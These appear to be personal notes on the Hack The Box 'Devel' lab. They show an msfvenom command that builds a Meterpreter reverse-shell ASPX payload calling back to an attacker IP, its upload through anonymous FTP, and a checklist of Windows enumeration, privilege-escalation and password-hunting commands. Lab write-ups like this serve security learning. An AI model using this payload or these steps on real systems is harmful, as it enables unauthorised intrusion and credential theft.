
#challenge Devel in **Hack the box**

#### System Enumeration:
scan the machine through nmap

If the application is hosted with IIS then the application is vulnerable to .aspx exploits.
windows > meterpreter > reverse_tcp

using ftp anonymous login, generated a payload and uploaded in the web.

`msvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=3344 -f aspx > shell.aspx`

After the connection got established in meterpreter shell. Looking  for 
	`getuid` -- Looking for the administrator `NT AUTHORITY\SYSTEM`
	`sysinfo`
	 
	![[Pasted image 20230809045749.png|400]]
`sysinfo` - get all the details of the machine, including owner, memory and everything.
	`sysinfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"` #findstr 
	`hostname`
`wmic qfe` - windows management instrumentation command line 
	`qfe - quick fix engineering` 
		which tells the information about last security updates happened on the machine.
		`wmic qfe get Caption,Description,HotFixID,Installation`
			we can copy paste list into the during enumeration 
	returns systems information that are running on 
`wmic logicaldisk get caption,description,providername`


#### User Enumeration:
With in victim machine
`whoami /priv`
	`SeAssignPrimaryTokenPrivilege` - Token impersonation
		potato Attacks like juicy potato, rotten potato
		![[Pasted image 20230809052805.png|500]]
`whoami /groups`
`net user`
	will list down all accounts
`net user *username*`
	list down the details of username
`net localgroug administrators`


#### Network Enumeration:
`ipconfig /all`
`arp -a` - arp tables just a protocol that communicating with other machines or other protocols.
	![[Pasted image 20230809053420.png|400]]
	If you're in a lab environment you may get a change to see another ip in the interface.
`route print` - will show info of iface list and routes of the ip in the machine
`netstat -ano`
	LISTENING - some services only be available to inside networks "only within the machine"
		Utilization with Tool - meterpreter 
#### Password Hunting:
SAM file, WI FI Home `netsh wlan show profile` 
#findstr `findstr /si password *.txt*`
	/si -search for
`sc query windefend` - service control
`sc queryex type=service `  - querying all the services running on the machine

`netsh advfirewall dump` (or) `netsh firewall show state` 
	- to collect the info of how the firewall gets configured.
		`netsh firewall show config`
		
